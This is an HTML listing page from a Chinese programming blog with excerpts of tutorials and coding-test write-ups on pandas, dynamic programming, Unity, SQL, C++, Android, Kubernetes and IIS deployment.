<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Posts - 编程随想</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="Posts" />
<meta property="og:description" content="编程随想的博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="/posts/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/posts/index.xml" title="编程随想">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程随想" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程随想</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<header class="main__header">
		<h1 class="main__title">Posts</h1>
	</header><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cbb666d2e07357620e753547c8dfb9eb/" rel="bookmark">
			Pandas-时间序列（三）-重采样：改变TimeSeries的采样频率【降采样：高频数据 → 低频数据（以天为频率转为以月为频率）】【升采样：低频数据 → 高频数据（以年为频率转为以月为频率）】
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		重采样：将时间序列从一个频率转换为另一个频率的过程，且会有数据的结合
降采样：高频数据 → 低频数据，eg.以天为频率的数据转为以月为频率的数据升采样：低频数据 → 高频数据，eg.以年为频率的数据转为以月为频率的数据 一、Timestamp重采样【rng = pd.date_range()】 1、降采样 1.1 OHLC采样（金融领域） OHLC：金融领域的时间序列聚合方式 → open开盘、high最大值、low最小值、close收盘
import numpy as np import pandas as pd # 重采样：.resample() # 创建一个以天为频率的TimeSeries，重采样为按2天为频率 rng = pd.date_range('20170101', periods=12) ts = pd.Series(np.arange(12), index=rng) print("ts = \n", ts) print('-' * 200) # freq：重采样频率 → ts.resample('5D') # .sum()：聚合方法 ts_re = ts.resample('5D') # ts.resample('5D')：得到一个重采样构建器，频率改为5天 ts_re2 = ts.resample('5D').sum() # ts.resample('5D').sum():得到一个新的聚合后的Series，聚合方式为求和 print("ts_re = ts.resample('5D') = \n{0} \ntype(ts_re) = {1}".format(ts_re, type(ts_re))) print('-' * 50) print("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/cbb666d2e07357620e753547c8dfb9eb/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ecf2df4fb3b2a7a9a1bcfe3ee5cbc669/" rel="bookmark">
			线性DP题目汇总(持续更新)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、前言 此篇章主要整理一些关于线性dp的题目，很多题目其实都可以被挂上线性dp的标志，比如最熟悉的最长上升子序列啊，最长公共子序列啊等等，并且线性dp在自己写力扣周赛的题目的时候，真的会时不时出几道，然后刚好利用这些题目加上dp分析的方法，把题目好好写一写。
二、题目汇总 ①力扣2369.检查数组是否存在有效的划分 (1)题目描述 (2)dp分析 状态转移方程：
f [ i ] = O r { f [ i − 2 ] , i ≥ 2 &amp; &amp; n u m [ i − 1 ] = n u m [ i − 2 ] f [ i − 3 ] , i &gt; = 3 &amp; &amp; n u m [ i − 1 ] = n u m [ i − 1 ] = n u m [ i − 2 ] f [ i − 3 ] , i &gt; = 3 &amp; &amp; n u m [ i − 1 ] − n u m [ i − 2 ] = n u m [ i − 2 ] − n u m [ i − 3 ] = = 1 f[i]=Or \begin{cases} f[i-2], i\ge2\&amp;\&amp;num[i-1]=num[i-2] \\\\ f[i-3],i&gt;=3\&amp;\&amp;num[i-1]=num[i-1]=num[i-2] \\\\ f[i-3],i&gt;=3\&amp;\&amp;num[i-1]-num[i-2]=num[i-2]-num[i-3]==1 \end{cases} f[i]=Or⎩ ⎨ ⎧​f[i−2],i≥2&amp;&amp;num[i−1]=num[i−2]f[i−3],i&gt;=3&amp;&amp;num[i−1]=num[i−1]=num[i−2]f[i−3],i&gt;=3&amp;&amp;num[i−1]−num[i−2]=num[i−2]−num[i−3]==1​
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ecf2df4fb3b2a7a9a1bcfe3ee5cbc669/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c676c80bafcc66776f36c0643d067d62/" rel="bookmark">
			Unity学习笔记：在GameManager里记录手游操作框架
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		最新方法：
RectTransformUtility.ScreenPointToLocalPointInRectangle(canvas.transform as RectTransform , Input.mousePosition, canvas.worldCamera, out pos); 这个方法能直接返回鼠标在UGUI上的相对坐标，如果为手机的话将Input.mousePosition换成Input.GetTouch()，通过这个方法实现图标位置跟随鼠标位置移动的方式直接简化为：
RectTransformUtility.ScreenPointToLocalPointInRectangle (canvas.transform as RectTransform, Input.mousePosition, canvas.worldCamera, out pos) rectTransform.anchoredPosition = pos;//这里的rectTransform直接传入想随着鼠标动的图标的rectTransform 另一种使用方式为判断鼠标位置相对于图标的相对位置，直接改变上面方法的第一个参数，改为想要判断的图标的rectTransform就可以
RectTransformUtility.ScreenPointToLocalPointInRectangle (mainImage.rectTransform, Input.mousePosition, canvas.worldCamera, out pos) 通过这种方式获得的UI相对位置坐标可以直接用以下方式判断是否处于该UI触碰范围中
if (mainRect.rect.Contains(pos)) 针对UGUI自动适配之后会出现问题经过多次优化，直接上代码
using System.Collections; using System.Collections.Generic; using UnityEngine; using UnityEngine.EventSystems; using UnityEngine.UI; public class GameManager { //单例 #region 单例 private static GameManager main; public static GameManager Main { get { if (main == null) { main = new GameManager(); } return main; } } #endregion //全局变量 #region 全局变量z #endregion //手游端操作框架 #region 手机游戏Touch适配 public bool canchange = true; private bool forif; //返回两个手指开始点击屏幕 public bool GetDoubleClick() { forif = true; if (SystemInfo.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c676c80bafcc66776f36c0643d067d62/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/db36395d77e825a36f5ccc5c95486090/" rel="bookmark">
			vscode搜索所有汉字
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 vscode搜索所有汉字的正则
(.[\u4E00-\u9FA5]+)|([\u4E00-\u9FA5]+.) 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/35f0291318f9be5258d0eaa374c4b05c/" rel="bookmark">
			python数据处理
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、数组 1.创建 2.属性 a = np.arange(6).reshape(2, 3) # 使用resize方法改变数组形状, 不够的地方通过循环补充 b = np.resize(a, (3, 3)) print(a) print('更改之后:\n', b) ''' [[0 1 2] [3 4 5]] 更改之后: [[0 1 2] [3 4 5] [0 1 2]] ''' 3.切片 二、numpy 1.统计 通过axis=0 or 1 来进行行 or 列计算
平均数 mean()
中位数 median()
标准差 std()
方差 var()
最大值 max()
最小值 min()
求和 sum()
加权平均值 average()，其中包含一个weights(相应的权重，数组)
2.文件操作 loadtxt()
3.其他函数 1）random # 产生[-5,5)的两块2行3列的随机生成整数 np.random.randint(-5, 5, size=(2, 2, 3)) ''' array([[[-5, 0, -3], [ 0, -4, -4]], [[ 0, -2, -2], [-1, -4, 0]]]) ''' 可以通过seed()控制随机种子
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/35f0291318f9be5258d0eaa374c4b05c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/009d2fedef07ec5e23d95e95b6f7b267/" rel="bookmark">
			sql语句中使用临时表
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
一、临时表实现分步处理
1.概述
2.实例
2.1表格结构
2.2需求
2.3sql语句
2.4sql语句解析
二、临时表实现分层处理
1、概述
2、实例
2.1表结构
2.2需求
2.3sql语句
2.4sql语句解析
一、临时表实现分步处理 1.概述 当需要的结果需要经过多次处理后才能最终得到我们需要的结果时，就可以使用临时表，这里临时表就起到了一个中间处理的作用，实现了分步处理，简化了问题。
2.实例 2.1表格结构 pln_order_pool_detail(表名)
2.2需求 需要得到订单平均交付周期、最大交付周期、最小交付周期，为了实现这一需求，首先我们要求出每个订单的交付周期，其次我们需要将这些订单的交付周期求其平均值。
2.3sql语句 SELECT AVG( leadTime ) avgLeadTime, MAX( leadTime ) maxLeadTime, MIN( leadTime ) minLeadTime FROM ( SELECT DATEDIFF(reality_deliver_time,create_time) AS leadTime FROM pln_order_pool WHERE order_state = 'finish' ) a 2.4sql语句解析 其中 SELECT DATEDIFF(reality_deliver_time,create_time) AS leadTime FROM pln_order_pool WHERE order_state = 'finish' 是求出每个订单的交付周期作为临时表，每个订单的交付周期即状态(order_state)为'finish'的订单的实际交付时间(reality_deliver_time)减去该订单的创建时间(create_time)
DATEDIFF(reality_deliver_time,create_time)：该函数表示实际交付日期(reality_deliver_time)与创建日期(create_time)的间隔，且结果是以天数进行返回
AVG( leadTime ):将临时表中的交付周期通过AVG函数求出平均交付周期
MAX( leadTime):将临时表中的交付周期通过MAX函数求出最大交付周期
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/009d2fedef07ec5e23d95e95b6f7b267/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e0dcf15ee7c93d282bdd43d5f4f8a1bc/" rel="bookmark">
			Arco-design:table中得 checkbox根据条件来判断是否可以点击？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		背景：table列表不满足条件得不可以点击选中
实现方式：在数据源中添加一个disabled属性
代码如下：
页面代码： &lt;a-table row-key="name" :columns="columns1" :data="data" :row-selection="rowSelection" :pagination="false" /&gt; js代码： const rowSelection = reactive({ type: 'checkbox', showCheckedAll: true, onlyCurrent: false, }); const columns1 = [ { title: 'Name', dataIndex: 'name', }, { title: 'Salary', dataIndex: 'salary', }, { title: 'Address', dataIndex: 'address', }, { title: 'Email', dataIndex: 'email', }, ] const data = reactive([{ key: '1', name: '李逍遥', salary: 23000, address: '新手村', email: '李逍遥@example.com' }, { key: '2', name: '景天', salary: 25000, address: '永安当', email: '景天@example.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e0dcf15ee7c93d282bdd43d5f4f8a1bc/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ce609ccf6e2b7f1035bdc5871b1435a7/" rel="bookmark">
			注意力模型---Attention Model
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		注意力模型---Attention Model 1、Soft Attention Mode1.1 什么是Soft Attention Mode1.1 公式介绍 2、四种注意力中的打分函数2.1 加性注意力（additive attention）2.2 点积注意力（multiplicative attention）与双线性注意力(MLB)2.3 缩放点积模型 3、注意力变体3.1 硬性注意力机制3.2 自注意力（Self-Attention） 4、Attention 带来的算法改进 1、Soft Attention Mode 1.1 什么是Soft Attention Mode “Neural machine translation by jointly learning to align and translate”这篇论文提出了soft Attention Model，并将其应用到了机器翻译上面。所谓Soft意思是在求注意力分配概率分布的时候，对于输入句子X中任意一个单词都给出个概率，是个概率分布。
1.1 公式介绍 下面介绍一下理论文中提到的公式
在原版的Seq2Seq和添加了attention机制的Seq2Seq相比，在公式上的差别就是在式子Si中的C有没有i。因为这个i就代表了是不是每一个时间步骤上添加不同的背景向量。
Global Attention Mode其实就是softAttention Mode。在Seq2Seq的Decoder的过程中，每一个时间步的Context vector需要计算Encoder中每一个单词的注意力权重，然后加权得到。
Si代表每个Decoder的隐藏层输出
Ci表示的是背景向量，它可以由Encoder的隐藏层输出状态hj的加权平均数得出，其中状态所加的权就是注意力权重 ai。
**注意力权重 ai**可以看出就是一个softmax，用来归一化隐藏层si-1 与 Encoder的隐藏层输出状态hj的对齐程度评估。
eij是一种对齐模式，也就是注意力函数，这当中有着很多的变体。下面来看看这四种变体都有什么。
2、四种注意力中的打分函数 2.1 加性注意力（additive attention） 加性注意力是最经典的注意力机制 (Bahdanau et al., 2015) ，它使用了全连接层来计算注意力的分配：
其中，Pi表示Decoder的隐藏层输出；q表示Encoder所有的隐藏层输出；V，W，U都是可以训练的参数。
加性模型引入了可学习的参数，将向量 p p p和原始输入向量 q q q 映射到不同的向量空间后进行计算打分，显然相较于加性模型，点积模型具有更好的计算效率。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ce609ccf6e2b7f1035bdc5871b1435a7/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f61eadf770befa4bba4883bdfb54c756/" rel="bookmark">
			2023 秋招 大疆 8-7 后端笔试题总结
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1. Leetcode539 题意： 给定一个 24 小时制（小时:分钟 "HH:MM"）的时间列表，找出列表中任意两个时间的最小时间差并以分钟数表示。
示例 1：
输入：timePoints = ["23:59","00:00"]
输出：1
示例 2：
输入：timePoints = ["00:00","23:59","00:00"]
输出：0
来源：力扣（LeetCode）
链接：https://leetcode.cn/problems/minimum-time-difference
著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。
思路： 首先对所有时间进行排序，因为是 string类型，直接排序即可。其次，计算出每个时间对应的分钟，那么最小的时间必然出现在两个相邻的时间点。最后，需要特殊处理一下最后一个时间点和第一个时间点之间，可以将第一个时间点+24hour减去最后一个时间点即可.
代码： /* * @lc app=leetcode.cn id=539 lang=cpp * * [539] 最小时间差 */ // @lc code=start class Solution { public: int getMinutes(string time){ int h = stoi(time.substr(0,2)); int m = stoi(time.substr(3)); int total = h*60+m; return total; } int findMinDifference(vector&lt;string&gt;&amp; timePoints) { sort(timePoints.begin(),timePoints.end()); int n = timePoints.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f61eadf770befa4bba4883bdfb54c756/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b5003d507f29499c82eeeec2e854b7bc/" rel="bookmark">
			2023 秋招 趋势科技 8-5 后端笔试题总结
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		题目1 字符串替换 字符串替换，给定一个字符串，以及一个keys数组和values数组，keys数组和values数组相对应，在给定的字符串中，如果%中间的子串存在于keys中，则将%子串%替换为keys对应的values。
输入：
"%FILENAME%VIRUSNAME%SENDER%VIRUSNAME%FILENAME%"，
["SENDER","RCPTS","SUBJECT","FILENAME","VIRUSNAME","ACTION"],
["abc@test.com","test@company.com","Test","Myfile","ICAN","Delete"]
输出：
"MyfileVIRUSNAME%balabalabalaICANFILENAME%"
思路： 使用Map记录keys和values的关系，然后使用双指针，遍历给定的字符串即可，注意细节处理！这道题当时卡在细节处理了，难倒英雄汉。。。。
代码： #include&lt;iostream&gt; #include&lt;vector&gt; #include&lt;map&gt; using namespace std; class Solution { public: string get(string my_template, vector&lt;string&gt;&amp;keys,vector&lt;string&gt;&amp;values){ int n = my_template.size(); map&lt;string,string&gt; mp; for(int i=0;i&lt;keys.size();i++){ mp[keys[i]] = values[i]; } string ans = ""; int pre = 0; int len = 0; for(int i=1;i&lt;n;i++){ if (my_template[i]=='%'){ if(my_template[pre] == '%'){ len = i-pre-1; string tmp = my_template.substr(pre+1,len); if(mp.count(tmp)){ ans+=mp[tmp]; pre = i+1; continue; } len = i - pre; ans+=my_template.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b5003d507f29499c82eeeec2e854b7bc/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/22b8711ab63a9c39db7db2af0a9bc3d5/" rel="bookmark">
			C&#43;&#43;中mutable的用法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		mutable的中文意思是“可变的，易变的”，跟constant（既C++中的const）是反义词。
在C++中，mutable也是为了突破const的限制而设置的。被mutable修饰的变量，将永远处于可变的状态，即使在一个const函数中。
我们知道，如果类的成员函数不会改变对象的状态，那么这个成员函数一般会声明成const的。但是，有些时候，我们需要在const的函数里面修改一些跟类状态无关的数据成员，那么这个数据成员就应该被mutalbe来修饰。
以下代码如果要在matest中进行修改m_a的值，就得在定义const A a，去掉const，并且在A类方法的声明时去掉const，但是mutable可以突破这层限制。
#include &lt;iostream&gt; using namespace std; class A { public: A(int a):m_a(a){} void matest()const; void macout()const { cout &lt;&lt; m_a &lt;&lt; endl; } private: int m_a; }; void A::matest() const { //m_a = 10;//被const修饰的函数不允许修好任何类状态值(类里面的数据) cout &lt;&lt; m_a &lt;&lt; endl; } int main() { const A a(1); a.macout();//用const修饰的一个类使用一个const修饰的方法 return 0; } #include &lt;iostream&gt; using namespace std; class A { public: A(int a):m_a(a){} void matest()const; void macout()const { cout &lt;&lt; m_a &lt;&lt; endl; } private: mutable int m_a; }; void A::matest() const { m_a = 10;//在定义时用mutable来突破这层限制 cout &lt;&lt; m_a &lt;&lt; endl; } int main() { const A a(1); a.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/22b8711ab63a9c39db7db2af0a9bc3d5/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/54b184afd8e4252dc9c10d42fbe7c2e5/" rel="bookmark">
			Android万能适配器BaseRecyclerViewAdapterHelper的简单使用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		继我们上一章的网络请求的封装中，我们在现有的项目中通过我们的万能适配器来写一个简单的Recyclerview列表 效果图
video1
首先还是同样的道理，我们需要进行一个简单的依赖添加
//recyclerview列表和万能适配器 implementation 'androidx.recyclerview:recyclerview:1.2.0-alpha05' // implementation 'com.alibaba:fastjson:1.2.55' implementation 'com.github.CymChad:BaseRecyclerViewAdapterHelper:2.9.50' 然后在我们的Activity的布局文件中写入recyclerview列表
&lt;?xml version="1.0" encoding="utf-8"?&gt; &lt;LinearLayout xmlns:android="http://schemas.android.com/apk/res/android" xmlns:app="http://schemas.android.com/apk/res-auto" xmlns:tools="http://schemas.android.com/tools" android:layout_width="match_parent" android:layout_height="match_parent" android:orientation="vertical" tools:context=".MainActivity"&gt; &lt;androidx.recyclerview.widget.RecyclerView android:id="@+id/recyclerView" android:layout_width="match_parent" android:layout_height="wrap_content" /&gt; &lt;/LinearLayout&gt; 然后通过我们的id来写找到控件并且创建好适配器
binding.recyclerView.setLayoutManager(new LinearLayoutManager(this,LinearLayoutManager.VERTICAL,false)); messageReminderAdapter=new MessageReminderAdapter(R.layout.item_message_reminder, dataBeanList); binding.recyclerView.setAdapter(messageReminderAdapter); 然后需要我们创建一个适配器的布局文件item_message_reminder
&lt;?xml version="1.0" encoding="utf-8"?&gt; &lt;LinearLayout xmlns:android="http://schemas.android.com/apk/res/android" android:layout_width="match_parent" android:layout_height="wrap_content"&gt; &lt;ImageView android:id="@+id/iv_recycler" android:layout_width="180dp" android:layout_height="180dp" /&gt; &lt;TextView android:id="@+id/tv_recycler" android:layout_width="wrap_content" android:layout_height="wrap_content" android:layout_marginLeft="20dp" android:layout_marginTop="50dp" /&gt; &lt;/LinearLayout&gt; 然后创建适配器MessageReminderAdapter来继承我们的万能适配器
package com.ghn.networkdemo.adapter; import android.widget.ImageView; import com.bumptech.glide.Glide; import com.chad.library.adapter.base.BaseQuickAdapter; import com.chad.library.adapter.base.BaseViewHolder; import com.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/54b184afd8e4252dc9c10d42fbe7c2e5/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5eb4b5cc2a1e5a106e657dd5d21e5204/" rel="bookmark">
			win10下pycocotools安装及问题解决
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 前言 最近在学习目标检测的过程中需要使用到pycocotools，不出意外的话有需要进行环境配置了，在安装pycocotools遇到了一系列问题，可谓是头疼，这里记录一下相关的解决方法，供大家参考。
解决方法一 这个方法比较简单，直接将已经生成好pycocotools文件放入到当前的python环境中。以Anaconda为例，将如下的文件移入到python环境目录下。对于Python环境，需要看你当前使用的Python环境是什么，Anaconda一般在Anaconda安装目录下的envs中，选择你的环境，然后将图中文件移入到\Lib\site-packages内即可。同理，非Anaconda，只需要把文件移入到Python环境的\Lib\site-packages目录下即可。
这里贴一个Python3.6对应的pycocotools文件地址：
链接：https://pan.baidu.com/s/1Ou6_uk0VwjpiVGNAXcVcyA?pwd=i262 提取码：i262
解决方法二 通过whl文件进行下载安装，各个版本Python对应的whl文件地址:https://pypi.tuna.tsinghua.edu.cn/simple/pycocotools-windows/，根据自身情况进行下载。然后通过pip 命令进行下载whl文件。以Anaconda为例：
解决方法三 通过github下载pycocotools源码，然后进行安装。Github地址：https://github.com/philferriere/cocoapi。
首先下载到本地，然后进行解压。
如果是Anaconda，则打开Anaconda进入到解压后的文件夹中（需要进入到PythonAPI文件内），然后运行如下两个命令：
python setup.py build_ext --inplace python setup.py build_ext install 如果运行过程中出现error: Unable to find vcvarsall.bat等问题，建议安装VS 2015或者visualcppbuildtools_full.exe，安装完成后再次运行上述命令。VS 2015下载地址：链接：https://pan.baidu.com/s/1JtBN3kRSCEwmq8YW0b_0OQ?pwd=swgm
提取码：swgm
问题解决 ModuleNotFoundError: No module named 'pycocotools._mask 可能有两种情况：
成功安装了pycocotools,中途没有报错，并且通过命令行import pycocotools没有问题，在程序环境运行却报错
根据官方文档：需要检查Python环境是不是存在多个pycocotools文件夹。我遇到的情况就是在Lib目录下有文件夹，在Lib\site-packages也有相同的文件夹。ps：这里可以观察你报错的时候所显示的pycocotools文件夹路径。如果是在Lib目录下，就需要移动到Lib\site-packages内，保证只有Lib\site-packages有pycocotools文件夹。
安装pycocotools过程中出现错误
我是在执行下列命令时候出现错误，然后安装了VS 2015后，又用1的情况的解决方法成功解决了问题。
python setup.py build_ext --inplace python setup.py build_ext install 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ee74253bb5b0dbf234f9161d46944f12/" rel="bookmark">
			Candies差分约束
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Candies 题意:
有 n 个小朋友，编号 1∼n。
老师要给他们发糖果。
小朋友们的攀比心都很重，现在给出 m 条攀比信息。
每条信息包含三个整数 a,b,c，含义是小朋友 a 认为小朋友 b 的糖果数量最多只可以比他多 c 个，否则他就生气。
老师在发糖果时，必须照顾所有小朋友的情绪，让他们都感到满意。
请问，小朋友 n 最多比小朋友 1 多分到多少个糖果。
思路:我们可以把每一对关系看成一条边，如a-&gt;b权值为c， b &lt;= a + c,这是明显的差分约束的特征，且题目让我们求最大值，那么我们得求最短路，如果让我们求最小值，则我们要求最长路
#include&lt;iostream&gt; #include&lt;cstring&gt; #include&lt;queue&gt; #include&lt;stack&gt; using namespace std; const int N = 3e4+10, M = 150010; int h[N], e[M], ne[M], w[M], idx; int vis[N]; int dis[N]; int n, m; void add(int a,int b,int c){ e[idx] = b; ne[idx] = h[a]; w[idx] = c; h[a] = idx++; } void spfa(){ stack&lt;int&gt;q; q.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ee74253bb5b0dbf234f9161d46944f12/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a90b8ebc12e0586920d6deacb55ab27d/" rel="bookmark">
			Kubernetes Service对象
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 service 对象 selector就是如何去汇聚一组pod。
其次就是定义负载均衡的规则了，service是四层的，工作在网络传输层，所谓的protocol就是TCP或者UDP，以及服务发布在哪个端口上面，target是真正的pod服务运行在哪里。
这里其实就是端口映射了。
EndPoint对象 service和pod产生关联关系要通过endpoint对象产生的。
这个endpoint对象是谁产生的呢？是由controllermanager里面有个endpoint controller，这个endpoint controller会去watch pod和service这两类对象。
当它发现一个service被创建了，如果service里面定义了selector，那么就意味着这个service是想去关联一组pod，如果没有selector，那么controller manager是不会干活的。
如果有selector，那么endpoint controller会去建立一个和这个service同名的endpoint对象，然后按照service的selector去选择target port，然后它会去看pod的就绪状态，如果它是就绪的，那么在subset里面有个address和notreadyaddress，如果一个pod不就绪，它就在notreadyaddress里面，如果这个pod就绪了，它就在address里面。
endpoint对象本身就是关联了service和pod，endpoint里面维护了一堆的address，这些address就和pod的address，把这些都维护起来了，同时通过address和notreadyaddress将pod进行分类了。
pod的就绪状态体现在哪？处于notreadyaddress的pod是不接受流量的。
在新的kubernetes版本里面，有个新的对象在替换endpoint对象，这个是endpointslice，为什么有这个对象呢，它是为了做性能优化，比如一个service选择了5000或者10000个pod，针对这种应用，那么一个endpoint对象会有多大，它会维持很多信息，如果一个集群里面有这么多类型的service，那么这个集群里面会有非常非常多的endpoint大对象。
endpoint发生变化之后，比如服务由不能访问变成了可以访问，其实在每个节点上面的kube-proxy组件会去监听service和endpoint对象的变化，如果endpoint变化，那么就意味着集群里面所有节点上的kube-proxy都要监听到新的变化，并且去刷新这个配置，这就会产生一个问题，如果集群的规模比较大，然后你的endpoint对象又很大，因为这些都大，那么很有可能一些pod一下好，一下不好，如果每一次都有这样的变化，它都要去推送，就会将endpoint完整对象推送到所有节点 ，无论对控制面 apiserver还是kube-proxy，还是对网络压力都非常的大。
相当于你要做一个从apiserver往5000个节点上面推送这种大对象，而且是频繁的推送，这样的话整个集群的压力就会大。
所以endpointslice是干嘛的呢？针对大对象，我给你做一个一个的切片，比如service里面select了5000个pod，那么endpointslice可以设定将500个IP地址做个切片，或者1000个IP地址做成一个切片，那么切片就相当于之前几分之一的大小。
其次当pod发生变化的时候只影响到你一个endpointslice，而不是影响全局的。
这样的话假设说一个endpoint被切分为5个endpointslice，如果有一个IP变化，那么我要去传输的这个变化的对象就由原来一个很大的变为20%的传输，这样的话就有效的提升了性能。
不定义selector的service 如果不去定义selector service会干嘛呢？那么endpoint controller不会去为你的service去定义任何endpoint对象，但是你依然可以利用这一点完成负载均衡的配置。
外面有三台虚拟机，这三台虚拟机不在kubernets里面纳管，它有三个IP地址，但是我希望从集群内部去访问这三台虚拟机，那么我就建立一个service，这个service就不加selector，所以没有endpoint对象出现，然后手工去建立endpoint对象，这个endpoint对象里面的address就填入那三台机器的IP地址。
现在service和endpoint都有了，只不过endpoint是我手工建立的，那么kube-proxy一样会去工作，那么访问集群内部的服务就可以转到那三台虚拟机上面去了。
所以不带selector的service一般是用来访问集群外部的资源的。
Service Pod Endpoint对应关系 service和pod之间它们是多对多的关系，这个多对多的关系是由endpoint来关联的，所以endpoint名称和service名称是一样的，subset里面的address和notreadyaddress会关联到不同的pod，最后port的部分是从service拿过来的。
当我们去建立service的时候默认clusterip类型，apiserver里面有个参数叫做cluster service ip range，就是在启动整个集群的时候要为cluster ip配置可用的范围，真正去建立这个service的时候，apiserver会从可用IP区间里面帮你分配一个可用的clusterip。
[root@master manifests]# vi kube-apiserver.yaml - --service-cluster-ip-range=10.233.0.0/18 service类型 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/39a66b8789f22a87fbbe7e4f27353c06/" rel="bookmark">
			Windows IIS 环境部署 .NET Core 语言文件 SSL证书 HTTPS协议
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Azure 应用服务和 IIS 上 ASP.NET Core 的常见错误参考
.NET Core 应用程序发布概述【发布独立应用】
.NET Core 应用程序发布概述【发布依赖于运行时的应用】
Download .NET Core 3.1
Download .NET 5.0
Download .NET 6.0
1、安装 DotNetCore-WindowsHosting
下载并安装 .NET Core Hosting Bundle .NET Core 3.0 Hosting Bundle .NET Core 3.1.14 Hosting Bundle
2、发布程序
3、配置IIS
4、应用程序池
5、Asp.NET Core api 部署在 IIS 上 405-Method Not Allowed
解决方法：在部署的目录中找到 web.config 文件，添加 runAllManagedModulesForAllRequests
&lt;?xml version="1.0" encoding="utf-8"?&gt; &lt;configuration&gt; &lt;location path="." inheritInChildApplications="false"&gt; &lt;system.webServer&gt; &lt;handlers&gt; &lt;add name="aspNetCore" path="*" verb="*" modules="
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/39a66b8789f22a87fbbe7e4f27353c06/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e8f8ba5b0ff7fe6884cc0ac43aea801a/" rel="bookmark">
			关于js你肯定会用到的数组相关处理方法（数组合并，数组之间匹配，数组对象分类，去重等）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
